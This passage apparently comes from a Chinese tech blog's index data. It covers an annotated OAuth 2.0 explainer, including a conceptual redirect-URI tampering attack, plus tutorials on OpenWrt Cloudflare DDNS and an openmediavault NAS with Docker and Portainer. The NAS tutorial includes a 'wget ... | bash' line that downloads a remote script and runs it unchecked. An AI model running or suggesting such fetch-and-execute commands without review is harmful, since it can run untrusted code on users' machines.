使用），并能校验，尤其是在不安全传输通道传递或重定向 URI（指向 redirection endpoint 即 client）在注册时并不完整的情况下。 可以对 compromised 的 client 进行吊销，从而避免攻击者滥用盗取的 refresh token，至于如何吊销，禁用或改变某个 client 的身份凭证均可。很明显，禁用/改变单个 client 的身份凭证比吊销一整套 refresh token 要来得快捷。 带来认证管理的最佳实践，因为认证管理一般要求定期轮转身份凭证（periodic credential rotation）。定期轮转一整套的 refresh token 要比轮转单独的 client 身份凭证要复杂得多。 public client缺乏安全保管凭证的能力的 client，例如安装到最终用户设备的软件。authorization server 可选（MAY）和 public client 建立身份认证措施。然而，此时 authorization server 一定不能（MUST NOT) 为了辨识 client 身份而信赖 public client 的认证结果。解读：这是很显然的，public client 不具备安全的认证能力典型的 client 实现有 3 种典型实现： web application 使用诸如 PHP、Java、Python、Ruby 和 ASP.NET 这样的语言和相应框架开发的运行在服务器上的程序（也叫后端），resource owner 在设备上通过 user-agent（一般就是浏览器）访问其提供的 HTML 用户界面（也叫前端）。这种架构下，client 的身份凭据以及任何被颁予的 access token/refresh token 都存储在后端，即不会暴露给 resource owner。所以有前后端之分的 web application 是 confidential 的，应使用最完整、最安全的 authorization code 授权模式（grant type）。实际例子： Google OAuth 2.0 之 Web Server Applications。 user-agent-based application 顾名思义，这是一种代码是从 Web 服务器上下载然后运行在用户设备上的 user-agent（例如浏览器）之上的 client。它没有执行代码的后端服务器，只有负责托管前端资源服务器，因此只能借助 user-agent 的能力来调用 resource server、authorization server 的接口。也因此 OAuth 2.0 工作流程中的数据流、凭证&amp;amp;授权信息都将很容易就能被 resource owner 访问（通常也是可见的）。所以，它使用 code 模式将没有意义，不仅没有安全效益，还会降低性能。显然 user-agent-based application 是 public 的，应使用 implicit 授权模式。实际例子：Google OAuth 2.0 之 Client-side Web Applications（也有称为 Single-Page Apps 的）。 native application 一种在最终用户设备上安装和运行（比如桌面应用，手机原生应用）、并被 resource owner 使用的 client，与 user-agent-based application 一样，数据流、凭证&amp;amp;授权信息也是可以被 resource owner 访问的。native application 是 public 的，可以使用 authorization code 模式或 implicit 模式，但由于 native application 不具维持身份凭证机密性的能力，因而使用 authorization code 授权模式将达不到预期的安全性，所以理论上不应该执行 client credentials 验证。但在 OAuth 2.0 for Native Apps 和 Proof Key for Code Exchange by OAuth Public Clients (PKCE) 两个 native application 实践规范中提出了改进的使用 authorization code 授权模式方法，读者可自行前往了解。实际的例子有：Google OAuth 2 之 Mobile &amp;amp; Desktop Apps 到这里你可能会疑惑，native application 与前述 user-agent-based application 有什么区别呢？user-agent-based application 本身就运行在 user-agent（如浏览器）内部，所以它很容易就能利用 user-agent 的能力来执行授权请求（想想看，授权系统大部分是构建在 HTTP Web 上，并使用 user-agent 提供用户界面），而 native application （注意区别于 user-agent，二者概念上是分离的）：它需要额外借助一个 external user-agent （例如：独立的浏览器应用）或 embedded user-agent（例如：嵌入原生应用的 WebView）来执行授权请求，所以相比 user-agent-based application，native application 要特别地考虑安全性、操作系统特性以及整体的用户体验。另外，按使用不同形式的 user-agent ，native application 接收 authorization server 响应的授权信息（ token 或 code）的方式不同：External user-agent - native application 向操作系统预先注册 URI scheme（例如 Android Deep Link），然后由 user-agent 重定向此 URI 来接收响应（参考 Chrome 的实现）；手动复制粘贴授权信息；启动一个本地的 web 服务器；安装一个浏览器插件/扩展；或如果有 client 可控的服务器，也可以重定向响应到该服务器，由该服务转递给 native application 使用；Embedded user-agent - native application 通过直接通信从 embedded user-agent 处接受响应，所谓直接通信，包括监视资源加载时导致的状态变化或访问 user-agent 的 cookie 存储。（造成上述二者区别的原因：技术上前者通常和 native application 是不同应用程序，有不同进程边界，而后者则或运行在 native application 的进程空间或属于 native application 的一部分）扩展解读：距离 RFC6749 发布近 8 年，现代浏览器的技术实现细节发生了很多变化，规范早期定义的 user-agent 的具体形态也随之调整。例如 Android 平台 Chrome 浏览器的 Custom Tab 特性，提供了一种不离开应用（in-app）使用浏览器的方式，这种情景下 user-agent 虽然「嵌入」到应用内，却具有隔离的运行空间和上下文，应用无法访问 Tab 内的 Web 内容。因此术语「external」应当引申为具有独立隔离的运行、安全环境，而不局限于字面意义上的「外部」。Protocol Endpoints先介绍 endpoint 概念: 在 Web 服务领域，endpoint是代表该服务对外暴露的一个或多个可以接受消息的最终端点（endpoint），即可被调用者引用的入口、处理器或资源，使得来自外部的 Web 消息可以寻址到该最终端点。endpoint 传达了寻址 Web 服务所需的信息，客户端需要先了解此信息，然后才能访问服务。一句话解释：Web 服务用 endpoint 对外描述自己提供的接口的信息，使得客户端能够参考这些信息决定使用哪个 endpoint 的接口来访问服务，Web 服务可以按业务逻辑需要划分一个或多个 endpointOAuth 2.0 也使用 endpoint 来描述不同角色的不同功能接口，整个 OAuth 2.0 授权流程涉及的 endpoint 包括：Authorization Server 的两个 Endpoint Authorization endpoint - 被 client 用来获取 resource owner 的授权，借助于 user-agent 的重定向机制。 Token endpoint - 被 client 用来将（用户的）授权兑换为一个 access token，通常伴随着对 client 的认证。Client 的一个 Endpoint Redirection endpoint - 被 authorization server 用来返回包含授权凭证的响应，借助 resource owner 的 user-agent这些 endpoint 在四种工作模式中会或全部或部分的参与使用Access Token Scopescope 是在 client 发起 authorization request 时可选的参数，使 client 可以指定访问资源的范围，authorization server 在 acccess token 中响应的 scope 必须是以下情况之一 实际的 scope（如果认为 client 指定的范围太大） 默认的 scope scope非法scope 的格式是 用空格拼接的一个或多个字符串，字符串内容由 authorization server 自行定义，OAuth 2.0 规范中不做约束。更多关于 Protocol Endpoints 的介绍请参考 rfc6749#section-3四种授权模式及工作流前文提到 resource owner 有四种授权模式（grant type）对 client 进行 authorization grant，对应的，有四种工作流程，本章逐一介绍。拓展阅读：其实，OAuth 的 1.0 版本期望用全面的单一协议流程来囊括所有应用场景（OAuth 1.0 早期本来也是分离的三种流程，但后来各方讨论后合并为单一种），然而实践中发现单一流程虽能比较好地适用于基于 Web 的应用程序，但在其他方面却提供了较差的体验，而单一但复杂的流程也造成了集成困难和混乱。OAuth 2.0 版本，终于回归细分场景适配不同流程的策略。关于这部分内容，参见 User Experience and Alternative Token Issuance Options。Authorization Code此模式下 resource owner 以间接的方式完成授权许可：client 不直接请求 resource owner，而是将 resource owner 引导到 authorization server，由 authorization server 来处理授权请求。如果resource owner 批准了请求，authorization server 将反过来引导 resource owner 回到 client，并且伴随一个 authorization code。最终，client 凭借该 Code 请求 authorization server 来获取 Access Token。authorization server 决定返回 authorization code 之前， 会对 resource owner 进行身份认证，并且该身份认证过程仅发生在 authorization server 处，因此其认证凭据任何时候都不会分享给 client。同时，authorization code 还有一些安全上的裨益，例如 authorization server 能够认证 client （client 请求 access token 时）；access token 直接传递给 client，不会经由 resource owner 使用的 user-agent，从而避免 access token 暴露出去，包括暴露给 resource owner。authorization code 模式是为私密型 client 定制的，流程如下图所示 +----------+ | Resource | | Owner | | | +----------+ ^ | (B) +----|-----+ Client Identifier +---------------+ | -+----(A)-- &amp;amp; Redirection URI ----&amp;gt;| | | User- | | Authorization | | Agent -+----(B)-- User authenticates ---&amp;gt;| Server | | | | | | -+----(C)-- Authorization Code ---&amp;lt;| | +-|----|---+ +---------------+ | | ^ v (A) (C) | | | | | | ^ v | | +---------+ | | | |&amp;gt;---(D)-- Authorization Code ---------&#39; | | Client | &amp;amp; Redirection URI | | | | | |&amp;lt;---(E)----- Access Token -------------------&#39; +---------+ (w/ Optional Refresh Token) 注：由于要穿过 user-agent，步骤（A），（B）和（C）的线间断为两部分。 图 3：Authorization Code Flow图 3 描述的工作流程包含以下步骤：(A) client 通过构造 URI 引导 resource owner 的 user-agent 到 authorization server 的 authorization endpoint 上。OAuth 2.0 定义的参数包括其 client 标识，请求的 scope，local state，和一个一旦访问被批准时 authorization server 将 user-agent 重定向回去的 URI，这些参数是通过 URI query component 发送的（也就是 URL ? 后的参数）。例子： GET /authorize?response_type=code&amp;amp;client_id=s6BhdRkqt3&amp;amp;state=xyz &amp;amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1 Host: server.example.com(B) authorization server 认证 resource owner（通过 user-agent）确定 resource owner 许可还是拒绝 client 的访问请求。(C) 如果 resource owner 许可访问，authorization server 使用之前提供的重定向 URI（步骤 A 请求内或 client 注册阶段提供）将 user-agent 重定向回 client，并且通过 URI 的 query component 参数（也就是 URL ? 后携带 code）将 code 给 client。重定向的 URI 的参数（query component）包含 authorization code 以及 client 之前提供的 local state。(D) client 使用上一步获取的 authorization code 向 authorization server 的 token endpoint 请求 access token。这个过程，client 会向 authorization server 发起身份认证。client 包含用于获取 authorization code 的重定向 URI，将用于验证。(E) authorization server 认证 client，校验 authorization code 是否合法，并确保接收的重定向 URI 与步骤(C) 中用于重定向 client 的URI一致（在这里，URI 将用于返回 access token，需确保 authorization code 被对应的合法 client 使用）。如无问题，authorization server 以 access token 以及可选的 refresh token 作为响应。注：(E) 步骤，对于 为了避免错误地使用颁发给其他 client_id 的 authorization code，无认证的 client 必须发送 client_id 到 authorization endpoint，以避免 authorization code 冒用（但此举并不会给 protected resource 带来额外的安全性）。来源：3.2.1 节。由于重定向 URI 地址用于接收敏感的 code 和 token，避免发送到错误的 URI 对于安全而言至关重要。因此：1. 在 client 注册的时候应提供完整的重定向 URI（public client 必须，confidential client 应该），并确保工作流中的 URI 与注册时一致；2. 如果注册时未提供完整 URI，那么应该在 client 使用 code 来换 token 时，对 client 进行认证，使之与 code 签发时关联的 client 一致（另外一处 client 认证在其使用 refresh token 时）。如果不校验两次 URI 是否一致，以及与注册时 URI 一致，否则面临以下的重定向 URI 篡改攻击： 攻击者先在一个合法的 client（网站）注册一个账户，然后攻击者在自己的 user-gent 中发起 code 授权流程，进入到 authorization server 页面，此时攻击者可以将地址栏中合法 client 的重定向 URI 篡改成自己控制的 URI，然后将这样的链接发送给用户，用户被骗点击并完成授权，因为在 authorization server 处用户以为如平常一样授权给正常、可信的合法的 client，然而此时 code 被重定向发送给了攻击者的 URI。 攻击者取到 code 后使用正常的 client 重定向 URI 转发此 code，使流程继续，最终 code 换成 token，而此 token 绑定给了攻击者的账户，使得攻击者能够访问用户的资源。authorization code 模式不适合 Public 型 Client 使用，但在 OAuth 2.0 for Native Apps 和 Proof Key for Code Exchange by OAuth Public Clients (PKCE) 两个 native application 实践规范中提出了改进的使用 authorization code 授权模式方法。Implicit注：在 OAuth 2.0 RFC 发布之时 implicit 模式其实是专为运行在浏览器上用 JavaScript 等前端语言实现的 client 而优化的，因为这种 client 如果使用 authorization code 模式将存在两个矛盾： client 需要多次跳转（重定向）才能获取到 access token，响应慢，效率低。 浏览器内应用（in-browser application）没有服务器后端承载业务功能，「前端先获取 authorization code，后端再换取 token」 没有意义：不仅不会带来安全增益，反而降低效率。在 implicit 模式， resource owner 许可访问后， client 会被直接授予一个 access token 而不是“中间码”（authorization code）。这是和 authorization code 模式相比最大的区别。 +----------+ | Resource | | Owner | | | +----------+ ^ | (B) +----|-----+ Client Identifier +---------------+ | -+----(A)-- &amp;amp; Redirection URI ---&amp;gt;| | | User- | | Authorization | | Agent -|----(B)-- User authenticates --&amp;gt;| Server | | | | | | |&amp;lt;---(C)--- Redirection URI ----&amp;lt;| | | | with Access Token +---------------+ | | in Fragment | | +---------------+ | |----(D)--- Redirection URI ----&amp;gt;| Web-Hosted | | | without Fragment | Client | | | | Resource | | (F) |&amp;lt;---(E)------- Script ---------&amp;lt;| | | | +---------------+ +-|--------+ | | (A) (G) Access Token | | ^ v +---------+ | | | Client | | | +---------+ 注：由于要穿过 user-agent，步骤（A）和（B）的线间断为两部分。 图 4: Implicit Grant Flow注：由于没有用 authortization code 交换 token 这一步骤，client 不和 authortization server 直接交互；implicit 模式下 authorization server 不认证 client，而是仅用重定向 URI 来标识 client 身份，因此确保 URI 的完整性是 implicit 模式的安全关键。Resource Owner Password Credentials不同于 authortization code 和 implicit 授权模式在 authorization server 处间接授权 client，resource owner password credentials 授权模式是 resource owner 直接将自身的口令（例如用户名和口令)）作为授权凭据，让 client 获取 access token。显而易见，这种授权模式仅适用于 resource owner 和 client 之间存在有高度的信任关系（比如 client 是操作系统的一部分或高度特权的应用），且其他的授权许可类型不可用时，意味着 auhtorization server 需要谨慎支持这种模式。尽管该授权模式需要 client 直接接触 resource owner 的凭据（意味者存在凭据泄露或身份被仿冒的可能），但实际上 resource owner 的凭据仅在请求时使用一次，最终还是会被转换成 access token。因此，password 模式可用于需要规避 client 为了后续使用而存储 resource owner 凭据的场景（比如 HTTP Basic、HTTP Digest 认证），其核心安全收益在于将凭据替换成了长期的 access token 或 refresh token。 +----------+ | Resource | | Owner | | | +----------+ v | Resource Owner (A) Password Credentials | v +---------+ +---------------+ | |&amp;gt;--(B)---- Resource Owner -------&amp;gt;| | | | Password Credentials | Authorization | | Client | | Server | | |&amp;lt;--(C)---- Access Token ---------&amp;lt;| | | | (w/ Optional Refresh Token) | | +---------+ +---------------+ 图 5: Resource Owner Password Credentials Flow图 5 描述的工作流程包含以下步骤：(A) resource owner 向 client 提供自己的用户名和口令。(B) client 用上一步获取的凭据向 authorization server 的 token endpoint 请求 access token。(C) authorization server 认证 client 和 resource owner 的凭证，如果合法，颁发 access token。Client Credentialsclient 可以仅使用其 client credentials （或其他支持的认证措施）就可请求 access token，这适用于被请求的 protected resource 属于 client 控制的场景（注解：代表 client 自己访问资源而用户），或是 authorization server 事先安排的、其他 resource owner 的 protected resource。client credentials 授权模式必须仅用于 confidential 类型的 client。（因为这种授权模型，protected resource 的安全性依赖于对 client 的认证的安全性，public client 显然是不妥的） +---------+ +---------------+ | | | | | |&amp;gt;--(A)- Client Authentication ---&amp;gt;| Authorization | | Client | | Server | | |&amp;lt;--(B)---- Access Token ---------&amp;lt;| | | | | | +---------+ +---------------+ 图 6: Client Credentials Flow图 6 描述的工作流程包含以下步骤：(A) client 向 authorization server 的 token endpoint 发起认证并请求一个 access token。(B) authorization server 认证 client，如果合法，颁发一个 access token。解读：client credentials 是四种授权模式中唯一不需要 resource owner 参与的，严格来说 client credentials 授权模式并不属于 OAuth 2.0 要解决的典型场景（用户向三方授权），但它提供了一种解决方案，使 OAuth 2.0 授权框架更完整，适用于更宽泛的场景。实际的应用例子可以参考 Keycloak 的 Service Account。常见问题 如何理解 Redirection 和 Redirection URI？ 在 authorization code 和 implicit 授权模式，redirection 的目的和作用都是将 payload（credentials，例如 authorization code 和 access token）传递给 redirection URI 指定的实体。 在 authorization code 模式，有两次 redirection，一次是 authorization server 命令 user-agent 重定向到指定的 client URI ，来传递 authorization code 到 authorization code 授权模式的 client（一般在云端）；一次是 client 指定 authorization server 重定向到 client 提供的 redirection URI，来接收 access token。因此两次的 redirection URI 应当保持一致，且应是在预期的值，以确保安全。 在 implicit 模式，只有一次 redirection，authorization server 命令 user-agent 重定向到指定的 web-hosted client 提供的 redirection URI（实践中可以是系统 app-name:// 或 localhost），此时 user-agent 访问此 URI，但不会传递 access token（因为是 URI fragment 形式），web-hosted client URI 返回特定的 HTML/JS 页面，取出 access token，最终传递给 implicit 模式的 client（一般在本地）。 为什么 Access token 之外还要引入 Authorization Code？ 因为不希望授权（token）被暴露到不安全的环境。按照 OAuth 2.0 的模型，用户的认证是在 user-agent 处完成的，当实际使用 access token 的 client 和用户使用的 user-agent （如浏览器）之间存在安全保护等级差异时，那么就引入一个中间态授权码（intermediate credentials ，来源于 rfc6749#section-1.3.2，在OAuth 2.0 中就是 authorization code ），使得 resource owner 所处的 user-agent 仅接触一次性的 authorization code，而永远不会接触到真正的授权 access token（即便是 resource owner 也不可见）。最终的 access token 则由更加可信的 client（例如 confidential client）保管，这在安全上就有意义：可以防止 access token 被非法使用（而 authorization code 仅一次有效，且需要合法 client 才能兑换为 access token）。例如：具有后端服务器 web application 或 native application，就可以使用 authorization code 模式来间接安全地获得 access token，而显而易见 user-agent-based application 所有实现都位于 user-agent（浏览器）内，不适合使用 authorization code 。 利用 authorization server 间接处理授权请求才是安全最佳的方式，才是完全符合 OAuth 2.0 将用户授权从client 中分离出来这一核心理念的工作流程。 client 到底应该如何使用 access token 来请求资源？ resource server 又该如何校验 access token？ 你可能注意到 RFC 6749 并没有定义到底如何使用 access token，包括 client 以什么请求规格来使用 access token，更重要的 resource server 如何校验 access token 合法性、识别 scope，实际上规范甚至连 access token 的详细规格都没有定义：只说是一个代表权限被授予给 client 的字符串（”a string representing an access authorization issued to the client”），而非身份凭据。事实上 RFC 6749 只是抽象地说明了工作流程，而 access token 的规格和使用细节则超出规范范畴。（当然，这些都有配套 RFC 来规定） 前一个问题在 Bearer Token RFC 6750 中定义，你可搜索本文查到。 至于另外一个问题，有两种不同的思路的办法：其中很自然就想到的一种是 token 本身只是索引，resource server 通过查询 authorization server 来获取存储在数据库中的 access token 关联的元信息，这在 OAuth 2.0 Token Introspection - RFC 6742 中给出了详细的说明。 另一种则是本文提到的 self-container 即 token 自身包含结构化信息，典型实现是 JWT。在 RFC 7662 也提到了这一点。 和 OAuth 1.0的差别？ https://www.oauth.com/oauth2-servers/differences-between-oauth-1-2/ 业界最佳实践？ https://developers.google.com/identity/protocols/OAuth2 **简单说下 OAuth 2 ** https://aaronparecki.com/oauth-2-simplified/#single-page-apps（仅供参考） 什么时候用OAuth 2.0？ https://stackoverflow.com/questions/40956418/is-oauth2-only-used-when-there-is-a-third-party-authorization 为什么OAuth 2 在 Access Token 之外还要引入 Refresh Token？ https://stackoverflow.com/questions/3487991/why-does-oauth-v2-have-both-access-and-refresh-tokens OAuth和 Open ID，认证和授权，到底什么区别？ 参阅「Access Token 可以代表用户（认证）吗？」问题，正因为 access token 无法用于认证用户，而又有引入中间层（用户不直接在 client 处认证）的需求，因此诞生了 Open ID，使得 client 可以通过信任的另外的一个 authentication server 来认证某个用户：用户在这个 authentication server上使用凭据进行认证，然后 authentication server 告诉 client 用户真实的身份。 参考 Difference Between OAUTH, OpenID and OPENID Connect in very simple term? Access Token 可以代表用户（认证）吗？ access token 表征用户授权给特定的 client，而 client 用 access token 来在 resource server 处认证自己。换言之，如果 access token 用于「认证」，应当只能用于认证 client 自己，而不能用于认证用户。 一个可以证明将 access token 用来认证用户是错误的例子：假设 A、B 两个网站都依靠 C 网站的 access token 来认证用户，它们的做法是：如果能获取到访问 C 网站上用户 ID 的权限（access token），就用这个 ID 来认证用户。那么 A 网站就可以使用一个合法的 access token 在 B 网站上仿冒某个用户了，反之亦然。问题的根源在于网站们错误地将 access token 用于认证用户。这是对OAuth 2.0 的一种典型误用。 上述的回答还没有根本地回答问题，即为什么 client 从 access token 中无法获取用户的身份？仔细看 RFC6749 就可以知道，OAuth 2.0 规范并没有定义 access token 的规格，包括 client 如何解析 access token 等等，甚至规范认为 access token 作为字符串，对于 client 是不透明且没有语义的，client 只是拿着 access token 去访问资源，并只在 resource server 处产生语义（scope 等）。 参考 rfc6749#section-10.16 Access Token 仅代表权限，那么它如何和用户关联起来呢？换言之，一个 Access Token 的 Scope 能访问其他用户的资源么？ 参考 How can a OAuth2 resource server relate an access token to the user that authorized it to prevent unauthorized access to other user resources? 和 rfc7662 Code 模式下 Web Application 类型的 Client 将 Access Token 放置在服务器端使用，因为认为 user-agent 所在的环境不安全。但是 user-agent 和服务器端之间本身是有一层认证授权凭据（比如会话），如果这些信息容易泄露， 恶意 user-agent 同样可以使用它来操作 Access Token，那么把 Access Token 放在服务器端使用有什么安全意思呢，放置在 user-agent 处不是一样的吗？ access token 是 resource owner 的原始授权信息，而会话仅代表和 web application 之间建立的认证授权关系，截获了会话并不意味着能够任意操作 access token（必须通过有限的接口操作），这和原始 access token 泄露是不同的。 " }, { "title": "OpenWrt Cloudflare DDNS", "url": "/posts/openwrt-cloudflare-ddns/", "categories": "Tutorial, OpenWrt", "tags": "DDNS", "date": "2020-03-03 00:00:00 +0800", "snippet": "本文演示了如何在 OpenWrt 上安装和设置 DDNS 软件包，最后接入 Cloudflare 提供的 DDNS 服务。安装 DDNS 软件包要使用 Cloudflare DDNS，你需要安装 ddns-scripts 和 ddns-scripts_cloudfare.com-v4 两个软件包：opkg install ddns-scripts ddns-scripts_cloudfare.com-v4其中前者是 DDNS 服务主功能脚本，后者是它的 Cloudflare 支持。获取 Cloudflare API KeyDDNS 的原理其实很简单，就是客户端定期通过 DNS 服务商提供的 API 来修改指定域名的 DNS 记录。出于访问控制要求，DNS 服务商一般要求接口调用者提供身份认证凭据，比如下面提到的 API Key。Cloudflare 提供的 DDNS API 是 RESTful 形式，客户端调用时必须使用 Cloudflare 帐户对应的 API key，即身份凭证。可前往 My account 页面获取你的 API Key。例如ebcdefghijklmnopqrstuvwxyze1234567890配置 DDNS在 Dynamic DNS LuCI 界面中，新建一个 DDNS 配置项，内容如下： 勾选 Enabled Lookup HostName: 要执行 DDNS 的完全限定域名（FQDN），例如 subdomain.example.com IP address version: 勾选 IPv4-Address DDNS Service provider: 选择 cloudfare.com-v4 Domain: 按“主机名@域名”的格式填写，例如 subdomain@example.com Password/密码：填写先前获取的 Cloudflare API key Optional Parameter: 填写 &quot;proxied&quot;:false。由于 Cloudflare API 会默认开启 proxied 选项（就是 Cloudflare DNS 面板点亮域名旁边黄色的云朵，表示该域名已被 Cloudflare 执行 CDN 代理），而我们家用 DDNS 一般只是为了获取 IP 地址，被 Cloudflare 代理以后反而会获取不到真实的 IP 地址，所以这里一般要关闭这个选项，转变为 DNS only 模式 (即让 Cloudflare 面板黄色的云朵变灰)，否则你的域名会自动开启 proxied 功能以下选项表示要求使用 HTTPS 安全通道访问 Cloudflare，出于安全考量，建议打开 勾选 Use HTTP Secure Path to CA-Certificate: 填写 /etc/ssl/certs 注：OpenWrt 默认未预置 CA 根证书，使用如下命令安装opkg install ca-certificates最后，点击 Save &amp;amp; Apply 观察 DDNS 是否生效即可。" }, { "title": "搭建 openmediavault NAS", "url": "/posts/nas-on-openmediavault/", "categories": "Tutorial, NAS", "tags": "openmediavault, NAS", "date": "2020-02-27 00:00:00 +0800", "snippet": "本文详细记录了在 openmediavault 上搭建私人 NAS 的过程，包括：安装配置 openmediavault、Docker；部署 Transmission BT 工具、Nextcloud 网盘等容器；配置 HTTP/HTTPS 反向代理和 Let’s Encrypt 证书，最终实现个人 NAS 的搭建。为什么选择 openmediavault？简要对比部分主流 NAS 操作系统，博主认为 openmediavault 更优 Synology DSM 适合无技术背景或希望开箱即用的用户。博主不选择的原因： 相对臃肿，不够简洁 每块磁盘上都会安装操作系统以及后续安装的软件及其数据，导致用户存储和操作系统耦合，频繁的读写影响每块硬盘的休眠。 DIY 设备安装运行涉及版权，无法稳定升级版本 FreeNAS 对硬件要求比较高，尤其是内存最低要求 8G，其未来的目标用户应该主要是企业，不选。 openmediavault 基于 Debian Linux，开源免费。openmediavault 的目标就是面向家庭和小型办公环境，是对熟悉 Linux 又追求最小化安装的人的首选。 硬件选购建议博主用过的 DIY NAS 硬件有小马 V5（已退役）和蜗牛星际，这里提一些硬件选购建议，供读者参考： 专用设备NAS 的核心功能应当是可靠的数据存储，长期稳定运行是一大要素，因此不建议使用虚拟化技术（一设备多用途）、树莓派等非专用设备来构建你的 NAS。 低功耗低功耗不仅意味着绿色清洁，还带来更好的散热性能，这些都是 NAS 设备长期运行的基础 盘位至少 3，最优 4个人认为兼顾数据安全和丰富应用的硬盘布置策略是：占用 2 盘位的 RAID 1（mirror）+ 1 盘位单盘（或 2 盘位 RAID 0），前者用于存储个人数据或稀缺资源，后者用于 BT、电影分享等数据容易重新下载的场景。因此满足此策略的 4 盘位硬件就足矣，至于超过 4 盘位的，个人觉得不必要。另外，所有的 NAS 系统都有物理机裸装和运行在 ESXi 等虚拟化平台上两种区分，但考虑到虚拟机对 S.M.A.R.T、磁盘休眠等需要硬件直通的特性支持不好，而这些功能是 NAS 长期稳定、低功耗运行的核心，因此强烈建议不要使用虚拟化安装 NAS。更新：2 盘位实际上也可以采用 rsync 目录同步软件来实现双盘备份，不失为更经济实用的方案。安装 openmediavaultopenmediavault 基于 Debian，因此安装过程与绝大部分 Linux 发行版没什么两样：先在官网下载 ISO 文件，解压到 U 做成启动盘，最后引导设备启动到安装程序完成安装。几个注意事项： 在安装界面执行磁盘重新分区时，可能会报无法安装系统文件的错误，忽略错误重启一次即可 网站提供的 ISO 镜像最新版本是 5.0.5，但安装完成后会自动升级到最新版本 安装过程确保联网更新，避免网卡驱动安装异常（重启动后无法获取 IP 地址）等问题。更新源选择国内的节点，如清华，否则速度极慢 安装过程语言选项可选择英文或中文，影响 Debian 和 openmediavault 的语言。建议选英文，因为 openmediavault 的时区、语言安装完成后很容易通过其界面更改设置共享文件夹创建共享文件夹openmediavault 成功运行后，就可以用其 Web 图形界面组建 RAID 和创建可被外部访问的共享文件夹了，基本流程是：清除磁盘（可选）- 组建 RAID（可选）- 创建文件系统 - 挂载文件系统 - 添加共享文件夹 - 打开文件共享服务（可选）注意：默认的 admin 管理员用户不能用于访问共享文件夹，需要新建一个普通用户；所有共享文件访问都应当通过 openmediavault 共享文件夹机制：主机外使用各种基于网络的文件共享服务，主机内使用 /srv/dev-disk-by-label-xxxx/yoursharedfolder 路径来访问共享文件夹（请注意，在最新的 openmediavault 上，/sharedfolders/ 已废止使用）。多用户模式（可选）如果你的 NAS 是个人专用，不考虑家庭共享，可以忽略本小节。但是如果你的 NAS 要满足一大家庭或为此做打算，可以如下两种模式中选择一种来设计多用户和共享文件夹，使得不同用户的数据互相隔离。模式一：使用主目录 创建用户 根据实际需求创建，你、你的家人… 开启使用主目录选项 前往 访问权限管理 - 用户 - 设置 启用主目录功能，让 openmediavault 为每个用户分配专属家目录。这里 home 目录需要绑定到一个共享文件夹，可以事先创建名为 home 的共享文件夹，该目录属主、用户组应为 root:users，其中 user 组仅有 x 权限，其他用户无权限。 使 Samba 访问时只显示该用户的主目录，不显示多余的 homes 目录 前往 服务 - SMB/CIFS - 主目录 - 选中 启用用户主目录，取消选中设为可浏览 按照上面方法，每个用户都将拥有独立的数据目录，并且不同用户间互相隔离仅对属主开放权限。至于整个家庭范围内共享的数据，可以额外按需创建共享目录。例如：创建一个名为“家庭共享”的共享目录，将所有家庭范围分享的数据放置在此目录下：由于 openmediavault 新建用户默认都属于 user 组，对于这类共享目录，整个家庭都将可以访问。模式二：为每个用户创建独立的共享文件夹对于每个新建的用户，单独设立一个共享文件夹，并且对每个共享文件夹执行 ACL 设置隔离规则： 属主修改为该用户 用户组修改为该用户对应的专用用户组，而非 users 组（这要求你提前建立好用户组）修改好以后，不同用户间就没有权限访问对方的共享目录了，但是在 Samba 中，无权限者还是会看到这些共享目录，要对无权限者屏蔽这些共享目录，可在 SMB/CIFS 中对这些共享目录设置一条 extra options，内容为：access based share enum = yes同时在 Shared Folders - Privileges 选项中显式拒绝其他用户的访问权限。（正如其说明，Privileges 只会影响共享服务的权限配置，而不会反映到文件系统）安装 Docker 环境安装 Docker为了运行 Nextcloud（云盘）、Transmission（BT 下载）等软件，需要安装和配置 Docker 运行环境。首先按其官网的方法安装三方扩展插件库 omv-extras ：sudo wget -O - https://github.com/OpenMediaVault-Plugin-Developers/packages/raw/master/install | bash安装完毕后，直接在 openmediavault 新增的 omv-extras 选项中点击按钮安装 Docker 即可启用 user namespace默认情况，docker 容器内的 UID 0 用户会映射到主机的 root 用户，因此默认情况下绝大部分容器进程就是以本机 root 用户运行，非常不雅。虽然可以通过指定容器运行的用户来规避，但是实际运用会发现很多镜像会报权限无法正常运行，好在新版本的 docker 已经支持 Linux user namespace 安全能力，可使得容器内的「root」直接映射为主机上的普通用户。注意：务必在创建第一个镜像之前就执行此步骤，否则在启用 user namespace 之前已经创建的容器、volume 等都会在启用后将「冻结」（就是完全隐藏，也无法使用），直到 docker 退出 user namespace 模式。要启用 docker 的 user namespace 隔离功能，编辑 /etc/daemon.json 如下{ &quot;userns-remap&quot;: &quot;default&quot;}其中 default 表示使用 docker 默认创建的用户、用户组来执行映射，也可以自行指定要映射的用户。详细配置方法参考官网。开启 userns-remap 后，使用 systemctl restart docker 使之生效，并可以使用以下命令查看是否生效：$ grep dockremap /etc/subuiddockremap:231072:65536$ grep dockremap /etc/subgiddockremap:231072:65536上面的 subuid/subgid 是 Linux 的从属（subordinate）uid/gid 配置文件， 其中 dockremap:231072:65536 被分配了从 231072 开始， 231072 + 65536 结束的 uid/gid 范围。这样，docker 容器内的 uid/gid 0 就会映射到主机上的 uid/gid 231072，而 uid/gid 1 则映射为主机上的 uid/gid 231072，以此类推。显然 uid/gid 231072 在主机上是毫无权限的，甚至并非是一个真实存在的用户或用户组。此后运行容器，通过 ps 命令可以看到容器进程的 uid 不再是 root，而是 231072当然，有些场景容器需要高权限运行，比如下面提到的 Portainer 这时，就可以用 --userns=host 参数来豁免 user namespace 隔离。安装 PortainerPortainer 是一个轻量级的 Docker 图形化管理工具，可以用来管理宿主机和 Docker Swarm 集群。Portainer 本身也是以容器运行，因此安装过程就是创建和运行一个容器。omv-extras 也提供了 Portainer 的安装界面，直接用它来安装即可。（注意：若启用了 docker namespace，需手动安装，方法见下）安装完成后访问 openmediavualt_host_ip:9000 即可访问其 Web 界面，首次登录需要创建一个管理员用户，然后会让你选择要连接的 Docker 环境，这里我们选择 Local，即此前安装的 Docker。可选：手动安装 Portainer（假设 docker 已经启用了 docker user namespace）：进入 https://www.portainer.io/install 选择 CE 版本，按官方指导进行安装（添加 --userns=host 参数以适应启用了 docker user namespace），例如：docker volume create portainer_datadocker run -d -p 9000:9000 -p 8000:8000 -p 9443:9443 --userns=host --name portainer \\ --restart=always \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v portainer_data:/data \\ portainer/portainer-ce:2.11.0要升级 Portainer：docker stop portainerdocker rm portainer然后重新执行上面的 docker run 命令即可部署 NAS 常用应用容器docker container 命令基础 Docker 默认以 root 运行容器进程，除非 